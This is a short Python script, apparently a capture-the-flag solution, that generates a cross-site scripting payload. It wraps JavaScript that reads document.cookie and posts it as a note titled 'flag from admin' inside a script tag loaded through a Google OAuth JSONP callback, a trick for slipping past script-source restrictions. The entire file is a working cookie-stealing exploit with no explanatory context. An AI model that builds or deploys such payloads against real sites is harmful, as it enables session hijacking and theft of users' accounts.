#import from py
import urllib

js_payload = """$.post('/note/new', {title: "flag from admin", content: document.cookie});"""
js_payload_quoted = urllib.pathname2url(js_payload)

jsonp_endpoint = "https://accounts.google.com/o/oauth2/revoke?callback="

xss_payload = '<script src="%s%s"></script>' % (jsonp_endpoint, js_payload_quoted)

print xss_payload